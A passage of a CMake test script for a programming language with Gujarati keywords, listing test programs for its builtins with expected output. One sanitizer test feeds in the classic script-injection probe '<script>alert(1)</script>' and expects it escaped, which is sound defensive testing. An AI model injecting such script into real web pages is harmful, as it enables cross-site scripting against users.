    set(expected_stdout "[<cycle>]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_json")
    set(source [=[aavo
data = {"name": "test", "val": 42};
json_str = json_lakho(data);
chhapo json_str;
parsed = json_vancho(json_str);
chhapo parsed["name"];
chhapo parsed["val"];
aavjo
]=])
    set(expected_stdout "{\"name\": \"test\", \"val\": 42}\ntest\n42\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_radix")
    set(source [=[aavo
b = dvi_sankhya(10);
chhapo b;
chhapo dvi_thi_sankhya(b);
h = hex_lakhan(255);
chhapo h;
chhapo hex_thi_sankhya(h);
aavjo
]=])
    set(expected_stdout "1010\n10\nff\n255\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_folder")
    set(source [=[aavo
chhapo folder_banao("test_dir");
chhapo folder_chhe("test_dir");
files = folder_suchi("test_dir");
chhapo lambai(files);
aavjo
]=])
    set(expected_stdout "1\n1\n0\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_functional_list")
    set(source [=[aavo
kary double_it(n) {
    parat n * 2;
}
kary is_even(n) {
    parat (n % 2 == 0);
}
kary add_two(a, b) {
    parat a + b;
}
nums = [1, 2, 3, 4];
doubled = naksho_yadi(nums, "double_it");
chhapo doubled;
evens = gaalo_yadi(nums, "is_even");
chhapo evens;
sum = sameto_yadi(nums, "add_two", 0);
chhapo sum;
first_even = shodho_yadi(nums, "is_even");
chhapo first_even;
first_even_idx = shodho_suchak_yadi(nums, "is_even");
chhapo first_even_idx;
aavjo
]=])
    set(expected_stdout "[2, 4, 6, 8]\n[2, 4]\n10\n2\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_list_flatten_zip")
    set(source [=[aavo
nested = [[1, 2], [3, 4], 5];
flat = chapti_yadi(nested);
chhapo flat;
names = ["a", "b"];
scores = [10, 20];
zipped = zip_yadi(names, scores);
chhapo zipped;
aavjo
]=])
    set(expected_stdout "[1, 2, 3, 4, 5]\n[[a, 10], [b, 20]]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_pattern_and_replace")
    set(source [=[aavo
chhapo pattern_shodho("hello world", "h*ld");
chhapo pattern_shodho("apple", "b*");
txt = "foo bar foo baz foo";
rep = lakhan_badlo_darek(txt, "foo", "qux");
chhapo rep;
aavjo
]=])
    set(expected_stdout "1\n0\nqux bar qux baz qux\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_base64")
    set(source [=[aavo
enc = base64_kod("GujaratiLang");
chhapo enc;
dec = base64_decode(enc);
chhapo dec;
aavjo
]=])
    set(expected_stdout "R3VqYXJhdGlMYW5n\nGujaratiLang\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_string_case")
    set(source [=[aavo
chhapo shirshak_lakhan("hello world of gujarati");
chhapo pratham_moti("developer");
aavjo
]=])
    set(expected_stdout "Hello World Of Gujarati\nDeveloper\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_swaroop")
    set(source [=[aavo
msg = swaroop("Namaste, {}! You scored {} points.", "Harshit", 100);
chhapo msg;
aavjo
]=])
    set(expected_stdout "Namaste, Harshit! You scored 100 points.\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_distance")
    set(source [=[aavo
dist = lakhan_antar("kitten", "sitting");
chhapo dist;
chhapo lakhan_antar("same", "same");
aavjo
]=])
    set(expected_stdout "3\n0\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_sha256")
    set(source [=[aavo
h1 = sha256_hash("");
chhapo h1;
h2 = sha256_hash("hello");
chhapo h2;
aavjo
]=])
    set(expected_stdout "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\n2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_trigonometry")
    set(source [=[aavo
s0 = sine(0);
c0 = cosine(0);
t0 = tangent(0);
chhapo s0;
chhapo c0;
chhapo t0;
chhapo arcsin(0);
chhapo arccos(1);
chhapo arctan(0);
aavjo
]=])
    set(expected_stdout "0\n1\n0\n0\n0\n0\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_gcd_lcm")
    set(source [=[aavo
chhapo guru_tam(48, 18);
chhapo laghu_tam(4, 6);
aavjo
]=])
    set(expected_stdout "6\n12\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_angle_conversions")
    set(source [=[aavo
r = ansha_thi_radian(180);
chhapo gol(r);
d = radian_thi_ansha(pi());
chhapo gol(d);
aavjo
]=])
    set(expected_stdout "3\n180\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_matrix")
    set(source [=[aavo
m1 = [[1, 2], [3, 4]];
m2 = [[5, 6], [7, 8]];
sum_m = matrix_sarvalo(m1, m2);
chhapo sum_m;
prod_m = matrix_gunakar(m1, [[2, 0], [1, 2]]);
chhapo prod_m;
aavjo
]=])
    set(expected_stdout "[[6, 8], [10, 12]]\n[[4, 4], [10, 8]]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "ternary_operator")
    set(source [=[aavo
x = 10;
res = x > 5 ? "high" : "low";
chhapo res;
res2 = x < 5 ? 100 : (x == 10 ? 200 : 300);
chhapo res2;
aavjo
]=])
    set(expected_stdout "high\n200\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "compound_assignment")
    set(source [=[aavo
x = 10;
x += 5;
chhapo x;
x -= 3;
chhapo x;
x *= 2;
chhapo x;
x /= 4;
chhapo x;
x %= 5;
chhapo x;
str = "Hello";
str += " World";
chhapo str;
aavjo
]=])
    set(expected_stdout "15\n12\n24\n6\n1\nHello World\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "constant_variables")
    set(source [=[aavo
achala MAX_LIMIT = 500;
chhapo MAX_LIMIT;
aavjo
]=])
    set(expected_stdout "500\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "constant_reassign_error")
    set(source [=[aavo
achala FIXED = 42;
FIXED = 100;
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "cannot reassign constant variable")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_version_platform")
    set(source [=[aavo
chhapo bhasha_avrutti();
p = platform_nam();
chhapo (p == "windows" || p == "linux" || p == "macos");
aavjo
]=])
    set(expected_stdout "3.9.0\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_env")
    set(source [=[aavo
paryavaran_lakho("GJ_TEST_VAR", "hello_env");
chhapo paryavaran("GJ_TEST_VAR");
aavjo
]=])
    set(expected_stdout "hello_env\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_path_utils")
    set(source [=[aavo
chhapo path_jodo("foo/bar", "baz.txt");
chhapo path_vistaran("my/dir/file.gj");
chhapo path_mukhya("my/dir/file.gj");
chhapo path_folder("my/dir/file.gj");
aavjo
]=])
    set(expected_stdout "foo/bar/baz.txt\n.gj\nfile.gj\nmy/dir\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_uuid")
    set(source [=[aavo
u = uuid_banao();
chhapo lambai(u);
aavjo
]=])
    set(expected_stdout "36\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_url")
    set(source [=[aavo
enc = url_kod("hello world & foo=bar");
chhapo enc;
dec = url_decode(enc);
chhapo dec;
aavjo
]=])
    set(expected_stdout "hello%20world%20%26%20foo%3Dbar\nhello world & foo=bar\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_statistics")
    set(source [=[aavo
l = [10, 20, 30, 40, 50];
chhapo yadi_sarvalo(l);
chhapo yadi_sareras(l);
chhapo yadi_madhyastha(l);
aavjo
]=])
    set(expected_stdout "150\n30\n30\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_lakhan_padding")
    set(source [=[aavo
chhapo lakhan_purn_dabi("42", 5, "0");
chhapo lakhan_purn_jamni("hi", 5, ".");
aavjo
]=])
    set(expected_stdout "00042\nhi...\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_bitwise")
    set(source [=[aavo
chhapo bit_ane(12, 10);
chhapo bit_athva(12, 10);
chhapo bit_xor(12, 10);
chhapo bit_shifte_dabi(1, 4);
chhapo bit_shifte_jamni(16, 2);
aavjo
]=])
    set(expected_stdout "8\n14\n6\n16\n4\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_list_sets")
    set(source [=[aavo
l1 = [1, 2, 2, 3];
chhapo yadi_ananya(l1);
l2 = [3, 4, 5];
chhapo yadi_mel(l1, l2);
chhapo yadi_chhed(l1, l2);
chhapo yadi_tavat(l1, l2);
aavjo
]=])
    set(expected_stdout "[1, 2, 3]\n[1, 2, 3, 4, 5]\n[3]\n[1, 2]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_char_code")
    set(source [=[aavo
c = akshar_kod("ABC", 1);
chhapo c;
s = kod_thi_akshar(65);
chhapo s;
aavjo
]=])
    set(expected_stdout "66\nA\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_exp_log")
    set(source [=[aavo
chhapo log_10(100);
chhapo ghat_mul(2, 8);
aavjo
]=])
    set(expected_stdout "2\n256\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_list_reverse")
    set(source [=[aavo
l = [10, 20, 30];
chhapo yadi_ulte_kram(l);
aavjo
]=])
    set(expected_stdout "[30, 20, 10]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_list_chunk")
    set(source [=[aavo
l = [1, 2, 3, 4, 5];
chhapo yadi_tukda(l, 2);
aavjo
]=])
    set(expected_stdout "[[1, 2], [3, 4], [5]]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_dict_utils")
    set(source [=[aavo
d1 = { "a": 1, "b": 2 };
chhapo chavi_chhe(d1, "a");
chhapo chavi_chhe(d1, "z");
d2 = { "b": 20, "c": 30 };
d3 = kosh_jodo(d1, d2);
chhapo d3["b"];
chhapo d3["c"];
aavjo
]=])
    set(expected_stdout "1\n0\n20\n30\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_micro_samay")
    set(source [=[aavo
t = micro_samay();
chhapo t > 0;
aavjo
]=])
    set(expected_stdout "1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_repeat_count")
    set(source [=[aavo
chhapo lakhan_aavrutti("abc", 3);
chhapo lakhan_ganatari("banana", "an");
aavjo
]=])
    set(expected_stdout "abcabcabc\n2\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_split_delim")
    set(source [=[aavo
res = lakhan_tukda_yadi("apple,banana;cherry:date", ",;:");
chhapo res;
aavjo
]=])
    set(expected_stdout "[apple, banana, cherry, date]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_file_lines")
    set(source [=[aavo
file_lakho("test_lines_tmp.txt", "line1\nline2\nline3\n");
lines = file_line_vancho("test_lines_tmp.txt");
chhapo lines;
file_kadho("test_lines_tmp.txt");
aavjo
]=])
    set(expected_stdout "[line1, line2, line3]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_hex_to_string")
    set(source [=[aavo
txt = hex_thi_lakhan("47756a61726174");
chhapo txt;
aavjo
]=])
    set(expected_stdout "Gujarat\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_csv")
    set(source [=[aavo
csv = "name,age,city\nAlice,30,Ahmedabad\nBob,25,\"Surat, City\"";
table = csv_vancho(csv);
chhapo table;
aavjo
]=])
    set(expected_stdout "[[name, age, city], [Alice, 30, Ahmedabad], [Bob, 25, Surat, City]]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_type_predicates")
    set(source [=[aavo
chhapo sankhya_chhe(42);
chhapo lakhan_chhe("hello");
chhapo yadi_chhe([1, 2]);
chhapo kosh_chhe({ "a": 1 });
chhapo nakamo_chhe(nakamo);
aavjo
]=])
    set(expected_stdout "1\n1\n1\n1\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "oop_class_and_methods")
    set(source [=[aavo
varg Person {
    rachna(name, age) {
        a_pote.name = name;
        a_pote.age = age;
    }
    kary greet() {
        chhapo a_pote.name;
        chhapo a_pote.age;
    }
}
p = navu Person("Harsh", 24);
p.greet();
aavjo
]=])
    set(expected_stdout "Harsh\n24\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "oop_inheritance")
    set(source [=[aavo
varg Animal {
    rachna(name) {
        a_pote.name = name;
    }
    kary speak() {
        chhapo a_pote.name;
    }
}
varg Dog anukaran Animal {
    rachna(name, breed) {
        a_pote.name = name;
        a_pote.breed = breed;
    }
    kary bark() {
        chhapo a_pote.breed;
    }
}
d = navu Dog("Buddy", "Golden");
d.speak();
d.bark();
aavjo
]=])
    set(expected_stdout "Buddy\nGolden\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "oop_gujarati_syntax")
    set(language_args "--language" "gu")
    set(source [=[આવો
વર્ગ બિલાડી {
    રચના(નામ) {
        આ_પોતે.નામ = નામ;
    }
    કાર્ય અવાજ() {
        છાપો આ_પોતે.નામ;
    }
}
બ = નવું બિલાડી("મીની");
બ.અવાજ();
આવજો
]=])
    set(expected_stdout "મીની\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_sleep_exit_cwd")
    set(source [=[aavo
suvo(1);
folder = sthanak_folder();
chhapo lakhan_chhe(folder);
ok = folder_badlo(folder);
chhapo ok;
aavjo
]=])
    set(expected_stdout "1\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_sangrah")
    set(source [=[aavo
sangrah_lakho("test_store.json", "theme", "dark");
val = sangrah_vancho("test_store.json", "theme");
chhapo val;
sangrah_lakho("test_store.json", "count", 42);
chhapo sangrah_vancho("test_store.json", "count");
aavjo
]=])
    set(expected_stdout "dark\n42\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_ini")
    set(source [=[aavo
ini_text = "[app]\nname = GujaratiLang\nversion = 1.1\n[db]\nport = 5432";
cfg = ini_vancho(ini_text);
chhapo cfg["app"]["name"];
chhapo cfg["app"]["version"];
chhapo cfg["db"]["port"];
aavjo
]=])
    set(expected_stdout "GujaratiLang\n1.1\n5432\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_env_expand")
    set(source [=[aavo
paryavaran_lakho("GJ_TEST_VAR", "Antigravity");
msg = paryavaran_vistaran("Hello ${GJ_TEST_VAR}!");
chhapo msg;
aavjo
]=])
    set(expected_stdout "Hello Antigravity!\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_url_prashno")
    set(source [=[aavo
params = url_prashno("https://example.com/api?search=gujarati&page=2");
chhapo params["search"];
chhapo params["page"];
aavjo
]=])
    set(expected_stdout "gujarati\n2\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_vector_math")
    set(source [=[aavo
v1 = [1, 2, 3];
v2 = [4, 5, 6];
chhapo vector_bindu(v1, v2);
chhapo vector_maan([3, 4]);
chhapo antar_euclidean([0, 0], [3, 4]);
chhapo (cosine_samanata([1, 0], [1, 0]) > 0.99);
aavjo
]=])
    set(expected_stdout "32\n5\n5\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_ml_primitives")
    set(source [=[aavo
x = [1, 2, 3, 4, 5];
y = [2, 4, 6, 8, 10];
reg = ml_rekhiya_sambandh(x, y);
chhapo reg["dhal"];
chhapo reg["antarched"];
chhapo reg["r2"];
chhapo ml_relu(-10);
chhapo ml_relu(15);
chhapo (ml_sigmoid(0) > 0.49 && ml_sigmoid(0) < 0.51);
aavjo
]=])
    set(expected_stdout "2\n0\n1\n0\n15\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_ml_advanced")
    set(source [=[aavo
chhapo ml_mse([1, 2, 3], [1, 2, 3]);
chhapo ml_mse([1, 2], [2, 4]);
scaled = ml_minmax_scaling([10, 20, 30]);
chhapo scaled[0];
chhapo scaled[2];
data = [1.0, 2.0, 10.0, 11.0];
km = ml_kmeans(data, 2, 10);
chhapo yadi_chhe(km["clusters"]);
chhapo yadi_chhe(km["centroids"]);
aavjo
]=])
    set(expected_stdout "0\n2.5\n0\n1\n1\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_binary_search_fuzzy")
    set(source [=[aavo
arr = [10, 20, 30, 40, 50];
chhapo shodho_dvimukhi(arr, 30);
chhapo shodho_dvimukhi(arr, 99);
f = shodho_sarshu("apple", ["apply", "banana", "orange"]);
chhapo f["match"];
chhapo (f["score"] > 0.7);
aavjo
]=])
    set(expected_stdout "2\n-1\napply\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_safe_casts")
    set(source [=[aavo
chhapo sankhya_rupantar("123.45", 0);
chhapo sankhya_rupantar("invalid", 999);
chhapo lakhan_rupantar(100);
chhapo lakhan_rupantar([1, 2]);
aavjo
]=])
    set(expected_stdout "123.45\n999\n100\n[1, 2]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "cli_tooling")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[aavo
chhapo 42;
aavjo
]=])
    set(program_arguments "--ast" "${source_path}")
    set(expected_stdout "Program: ${source_path}\n  ProgramStart (line 1)\n  PrintStatement (line 2)\n  ProgramEnd (line 3)\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v120_version_cli")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[aavo
chhapo 1;
aavjo
]=])
    set(program_arguments "-v")
    set(expected_stdout "3.9.0\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v120_url_and_static_web")
    set(source [=[aavo
u = url_banao("https://example.com/search", {"q": "gujarati", "page": 1});
chhapo u;
sf404 = web_static_file("non_existent_file.html");
chhapo sf404["status"];
file_lakho("test_page.html", "<h1>Hello</h1>");
sf200 = web_static_file("test_page.html");
chhapo sf200["status"];
chhapo sf200["headers"]["Content-Type"];
chhapo sf200["body"];
aavjo
]=])
    set(expected_stdout "https://example.com/search?q=gujarati&page=1\n404\n200\ntext/html; charset=utf-8\n<h1>Hello</h1>\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v120_embedded_db")
    set(source [=[aavo
db = db_kholo(":memory:");
db_chalao(db, "CREATE TABLE students (id, name, score)");
db_chalao(db, "INSERT INTO students (id, name, score) VALUES (?, ?, ?)", [1, "Harshit", 98]);
db_chalao(db, "INSERT INTO students (id, name, score) VALUES (?, ?, ?)", [2, "Amit", 85]);
chhapo db_count(db, "students");
high = db_shodho(db, "SELECT name, score FROM students WHERE score >= 90");
chhapo lambai(high);
chhapo high[0]["name"];
chhapo high[0]["score"];
db_chalao(db, "UPDATE students SET score = 90 WHERE name = Amit");
updated = db_shodho(db, "SELECT score FROM students WHERE name = Amit");
chhapo updated[0]["score"];
db_chalao(db, "DELETE FROM students WHERE id = 1");
chhapo db_count(db, "students");
db_bandh(db);
aavjo
]=])
    set(expected_stdout "2\n1\nHarshit\n98\n90\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v120_async_threading")
    set(source [=[aavo
kary worker(n) {
    sum = 0;
    darek (i ma 1..101) {
        sum = sum + i;
    }
    parat sum;
}
h = async_chalao("worker", 100);
ans = async_parinam(h);
chhapo ans;
tid = thread_id();
chhapo (tid > 0);
aavjo
]=])
    set(expected_stdout "5050\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v120_gujarati_nlp")
    set(source [=[aavo
toks = nlp_gujarati_token("નમસ્તે ભારત! ગુજરાતી ભાષા.");
chhapo lambai(toks);
chhapo nlp_matra_kadho("ગુજરાત");
freq = nlp_shabda_aavrutti(["a", "b", "a", "c"]);
chhapo freq["a"];
chhapo freq["b"];
aavjo
]=])
    set(expected_stdout "4\nગજરત\n2\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v120_ml_tfidf_bayes")
    set(source [=[aavo
docs = ["sarum pustak", "kharab pustak"];
tfidf = ml_tfidf(docs);
chhapo lambai(tfidf["vocabulary"]);
model = ml_naive_bayes_train(
    ["sarum pustak", "kharab pustak", "sarum ane sundar"],
    ["dhan", "run", "dhan"]
);
pred = ml_naive_bayes_predict(model, "sarum");
chhapo pred;
aavjo
]=])
    set(expected_stdout "3\ndhan\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v120_matrix_and_charts")
    set(source [=[aavo
m = [[1, 2], [3, 4]];
t = matrix_transpose(m);
chhapo t[0][1];
chhapo t[1][0];
d = matrix_determinant([[1, 2], [3, 4]]);
chhapo d;
id = matrix_identity(2);
chhapo id[0][0];
chhapo id[0][1];
c = chart_terminal_bar(["X", "Y"], [10, 20], 5);
chhapo (lambai(c) > 0);
aavjo
]=])
    set(expected_stdout "3\n2\n-2\n1\n0\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v120_ffi_call")
    set(source [=[aavo
sq = ffi_call("msvcrt", "sqrt", [25]);
chhapo sq;
aavjo
]=])
    set(expected_stdout "5\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v120_timers")
    set(source [=[aavo
kary echo(v) {
    chhapo "timer: " + lakhan_rupantar(v);
    parat 1;
}
samay_pachhi(5, "echo", 42);
samay_antare(5, "echo", 2, "interval");
aavjo
]=])
    set(expected_stdout "timer: 42\ntimer: interval\ntimer: interval\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v120_gujarati_native_syntax")
    set(source [=[આવો
દ = ડેટાબેઝ_ખોલો(":memory:");
ડેટાબેઝ_ચલાવો(દ, "CREATE TABLE t (x)");
ડેટાબેઝ_ચલાવો(દ, "INSERT INTO t (x) VALUES (?)", [10]);
છાપો ડેટાબેઝ_ગણતરી(દ, "t");
ડેટાબેઝ_બંધ(દ);
છાપો એનએલપી_માત્રા_કાઢો("ભારત");
છાપો મેટ્રિક્સ_નિશ્ચાયક([[2, 0], [0, 3]]);
આવજો
]=])
    set(expected_stdout "1\nભરત\n6\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "v130_sha1_and_templates")
    set(source [=[aavo
sha = sha1_hash("Hello Gujarati");
chhapo (lambai(sha) == 40);
tpl = render_template("Halo {{naam}}, score: {{ank}}!", {"naam": "Harshit", "ank": 100});
chhapo tpl;
san = html_saf("<script>alert(1)</script><b>Halo</b>");
chhapo san;
aavjo
]=])
    set(expected_stdout "1\nHalo Harshit, score: 100!\n&lt;script&gt;alert(1)&lt;/script&gt;&lt;b&gt;Halo&lt;/b&gt;\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v130_jwt")
    set(source [=[aavo
token = jwt_banao({"user": "admin", "role": "creator"}, "secret_key");
chhapo (lambai(token) > 20);
payload = jwt_tapas(token, "secret_key");
chhapo payload["user"];
chhapo payload["role"];
bad = jwt_tapas(token + "tamper", "secret_key");
chhapo bad;
aavjo
]=])
    set(expected_stdout "1\nadmin\ncreator\nનકામો\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v130_dataframe")
    set(source [=[aavo
data = [{"nam": "A", "val": 10}, {"nam": "B", "val": 20}, {"nam": "A", "val": 30}];
df = df_kholo(data);
f = df_filter(df, "val", ">=", 20);
chhapo f["shape"][0];
grp = df_group_by(df, "nam", "val", "sum");
chhapo grp["shape"][0];
csv_out = df_to_csv(df);
chhapo (lambai(csv_out) > 0);
aavjo
]=])
    set(expected_stdout "2\n2\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v130_deep_learning")
    set(source [=[aavo
nn = nn_create([2, 4, 1]);
out_act = nn_forward(nn, [0.5, 0.8]);
chhapo lambai(out_act);
trained_nn = nn_train(nn, [[0, 0], [0, 1], [1, 0], [1, 1]], [0, 1, 1, 0], 10, 0.2);
chhapo (trained_nn["loss"] >= 0);
chhapo (math_tanh(0) == 0);
chhapo math_leaky_relu(-10, 0.1);
aavjo
]=])
    set(expected_stdout "1\n1\n1\n-1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v130_statistics_charts")
    set(source [=[aavo
r = stat_pearson([1, 2, 3, 4, 5], [2, 4, 6, 8, 10]);
chhapo r;
z = stat_zscore([10, 20, 30]);
chhapo lambai(z);
box = chart_terminal_box([10, 20, 30, 40, 50]);
chhapo (lambai(box) > 0);
hist = chart_terminal_histogram([1, 2, 2, 3, 3, 3, 4, 5], 3);
chhapo (lambai(hist) > 0);
scatter = chart_terminal_scatter([1, 2, 3], [1, 4, 9], 15, 6);
chhapo (lambai(scatter) > 0);
aavjo
]=])
    set(expected_stdout "1\n3\n1\n1\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v130_math_eval")
    set(source [=[aavo
calc = math_eval("(10 - 2) * 3 + 2^3");
chhapo calc;
aavjo
]=])
    set(expected_stdout "32\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v130_bytecode")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(gjc_path "${TEST_BINARY_DIR}/${TEST_CASE}.gjc")
    set(source [=[aavo
chhapo 42;
aavjo
]=])
    file(WRITE "${source_path}" "${source}")
    execute_process(
        COMMAND "${PROGRAM}" "--compile" "${source_path}" "-o" "${gjc_path}"
    )
    set(program_arguments "${gjc_path}")
    set(expected_stdout "42\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v130_gujarati_syntax")
    set(source [=[આવો
શા = શા૧_હેશ("hello world");
છાપો શા;
ઢાં = નમૂનો_રેન્ડર("નમસ્તે {{નામ}}!", {"નામ": "ગુજરાતી"});
છાપો ઢાં;
સાફ = એચટીએમએલ_સાફ("<tag>");
છાપો સાફ;
ટોકન = જેડબલ્યુટી_બનાવો({"user": "harshit"}, "key");
ચકાસણી = જેડબલ્યુટી_તપાસ(ટોકન, "key");
છાપો ચકાસણી["user"];
ગ = ગણિત_ઉકેલો("5 * 4 + 2");
છાપો ગ;
છાપો ટેનએચ(0);
છાપો લીકી_રેલુ(-5, 0.2);
છાપો આંકડા_સહસંબંધ([1, 2], [2, 4]);
આવજો
]=])
    set(expected_stdout "2aae6c35c94fcfb415dbe95f408b9ce91ee846ed\nનમસ્તે ગુજરાતી!\n&lt;tag&gt;\nharshit\n22\n0\n-1\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "v140_regex")
    set(source [=[aavo
m1 = regex_match("^[0-9]+$", "12345");
chhapo m1;
m2 = regex_match("^[0-9]+$", "abc");
chhapo m2;
f = regex_find("\\d+", "Item 42 found");
chhapo f["match"];
chhapo f["start"];
rep = regex_replace("\\d+", "99", "A1B2C");
chhapo rep;
sp = regex_split(",", "x,y,z");
chhapo sp[1];
all_w = regex_all("\\w+", "Hello 2026 World");
chhapo all_w[0];
chhapo all_w[1];
aavjo
]=])
    set(expected_stdout "1\n0\n42\n5\nA99B99C\ny\nHello\n2026\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v140_audio_wav")
    set(source [=[aavo
p = "test_run_audio.wav";
ok = wav_create(p, 44100, [0.0, 0.5, 0.0, -0.5]);
chhapo ok;
info = wav_read(p);
chhapo info["sample_rate"];
chhapo info["channels"];
mel = sound_melody([261, 294], 10);
chhapo mel;
aavjo
]=])
